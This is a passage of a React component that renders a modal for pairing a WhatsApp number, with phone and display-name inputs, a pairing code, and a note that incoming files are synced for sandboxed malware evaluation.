                className="p-1.5 rounded-xl hover:bg-slate-100 text-slate-400 hover:text-slate-600 transition-colors cursor-pointer"
              >
                ✕
              </button>
            </div>

            <form onSubmit={handlePairWhatsAppNumber} className="space-y-4">
              <div>
                <label className="block text-xs font-semibold text-slate-700 mb-1">
                  Your Phone Number (with Country Code)
                </label>
                <div className="relative">
                  <div className="absolute inset-y-0 left-0 pl-3 flex items-center pointer-events-none text-slate-400">
                    <Smartphone className="w-4 h-4" />
                  </div>
                  <input
                    type="text"
                    value={waPhoneInput}
                    onChange={(e) => setWaPhoneInput(e.target.value)}
                    placeholder="+91-98XXXXXXXX"
                    className="w-full pl-9 pr-3 py-2.5 rounded-xl border border-slate-200 text-xs font-mono text-slate-800 focus:outline-none focus:border-emerald-500 bg-slate-50/50"
                    required
                  />
                </div>
              </div>

              <div>
                <label className="block text-xs font-semibold text-slate-700 mb-1">
                  Display Name
                </label>
                <input
                  type="text"
                  value={waNameInput}
                  onChange={(e) => setWaNameInput(e.target.value)}
                  placeholder="Keerat Kaur"
                  className="w-full px-3 py-2 rounded-xl border border-slate-200 text-xs text-slate-800 focus:outline-none focus:border-emerald-500 bg-slate-50/50"
                />
              </div>

              <div className="p-3 rounded-2xl bg-emerald-50/70 border border-emerald-200 text-xs text-emerald-800 space-y-1.5">
                <div className="font-bold flex items-center gap-1.5">
                  <QrCode className="w-4 h-4 text-emerald-700" />
                  <span>Encrypted Pairing Bridge</span>
                </div>
                <div className="text-[11px] text-emerald-700">
                  Pairing code: <span className="font-mono font-bold select-all bg-white px-2 py-0.5 rounded border border-emerald-300">{waPairingCode}</span>
                </div>
                <p className="text-[10px] text-emerald-600">
                  Syncs incoming documents, photos, snaps, and files for sandboxed malware evaluation.
                </p>
              </div>

              <div className="flex items-center justify-end gap-2 pt-2">
                <button
                  type="button"
                  onClick={() => setShowWaConnectModal(false)}
                  className="px-4 py-2 rounded-xl border border-slate-200 hover:bg-slate-100 text-xs font-semibold text-slate-600 cursor-pointer"
                >
                  Cancel
                </button>
                <button
                  type="submit"
                  disabled={waLoading || !waPhoneInput.trim()}
                  className="flex items-center gap-1.5 px-5 py-2 rounded-xl bg-emerald-600 hover:bg-emerald-700 text-white text-xs font-bold shadow-md shadow-emerald-500/20 cursor-pointer disabled:opacity-50 transition-all"
                >
                  {waLoading ? <RefreshCw className="w-3.5 h-3.5 animate-spin" /> : <Smartphone className="w-3.5 h-3.5" />}
                  <span>Connect & Load Chats</span>
                </button>
              </div>
            </form>
          </div>
        </div>
      )}
    </div>
  );
};
